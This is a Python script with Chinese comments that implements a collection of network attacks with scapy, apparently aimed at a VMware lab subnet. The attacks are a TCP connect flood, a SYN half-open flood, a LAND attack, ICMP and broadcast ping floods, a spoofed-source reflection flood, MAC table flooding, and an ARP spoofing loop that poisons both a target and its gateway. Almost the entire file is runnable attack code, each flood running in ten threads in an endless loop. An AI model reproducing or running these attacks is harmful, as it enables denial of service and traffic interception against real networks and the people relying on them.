#各类泛洪攻击
import random,time,os
import socket
import threading
from scapy.layers.inet import IP, TCP, ICMP
from scapy.layers.l2 import Ether, getmacbyip, ARP
from scapy.sendrecv import send, sendp
from scapy.volatile import RandMAC

#多线程装饰器
def do_thread(func):
    def do():
        for i in range(10):
            threading.Thread(target=func).start()
    return do

#TCP三次握手泛洪
@do_thread
def socket_flood():
    while True:
        s = socket.socket()
        s.connect(('192.168.222.142',80))

#使用scapy半连接泛洪
@do_thread
def scapy_flood():
    while True:
        sport = random.randint(10000,30000)
        pkg = IP(dst='192.168.222.142')/TCP(sport=sport,dport=80, flags='S')
        send(pkg, verbose=False)

#TCP land泛洪(源ip地址和目的ip地址是一样的)
@do_thread
def tcp_land():
    while True:
        sport = random.randint(10000,30000)
        pkg = IP(src='192.168.222.142',dst='192.168.222.142') / TCP(sport=sport, dport=80, flags='S')
        send(pkg, verbose=False)

#ICMP泛洪
@do_thread
def icmp_flood():
    while True:
        payload = 'HEllowoniu'*50
        pkg = IP(dst='192.168.222.140')/ICMP()/payload
        send(pkg,verbose = False)

#反射性攻击(也就是使用另一个主机的ip地址向靶机发送攻击，靶机就会把回复给该主机，从而使该主机和靶机都遭受攻击)
@do_thread
def reflect_flood():
    while True:
        payload = 'HEllowoniu'*50
        pkg = IP(src='192.168.222.140',dst='192.168.222.142')/ICMP()/payload
        send(pkg,verbose = False)

#发送广播数据包，对一个网段都实现泛洪攻击，实现广播风暴
#能支持广播的协议都可以实现该攻击

#ping命令泛洪
@do_thread
def icmp_broadcast():
    while True:
        payload = 'HEllowoniu'*50
        pkg = IP(dst='192.168.222.255')/ICMP()/payload
        send(pkg,verbose = False)

#mac地址泛洪
@do_thread
def mac_flood():
    while True:
        randmac = RandMAC("*:*:*:*:*:*")
        randip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        packet = Ether(src=randmac,dst=randmac)/IP(src=randip,dst=randip)
        sendp(packet,iface="VMware Network Adapter VMnet8",loop=0)

#arp攻击与欺骗
def arp_spoof():
    iface = "VMware Network Adapter VMnet8"
    #靶机的mac和ip
    target_ip = '192.168.222.142'
    #scapy中的函数，可以通过ip得到mac地址
    target_mac= getmacbyip(target_ip)
    print(target_mac)
    #攻击主机的mac和ip
    spoof_ip = '192.168.222.141'
    spoof_mac = '00:0c:29:71:bb:b8'

    #网关的mac和ip
    gateway_ip = '192.168.222.2'
    gateway_mac = '00:50:56:e2:d5:b6'
    print(gateway_mac)
    while True:
        #op=1为ARP请求，op=2为ARP响应
        #向靶机回应ARP请求，让靶机把攻击主机视为网关
        packet = Ether(src=spoof_mac,dst=target_mac)/ARP(hwsrc=spoof_mac,psrc=gateway_ip,hwdst=target_mac,pdst=target_ip,op=2)
        sendp(packet,iface=iface)

        #欺骗网关，让网关认为攻击主机是靶机
        packet = Ether(src=spoof_mac,dst=gateway_mac)/ARP(hwsrc=spoof_mac,psrc=target_ip,hwdst=gateway_mac,pdst=gateway_ip,op=2)
        sendp(packet, iface=iface)
        time.sleep(1)

if __name__ == '__main__':
    # mac_flood()
    
    arp_spoof()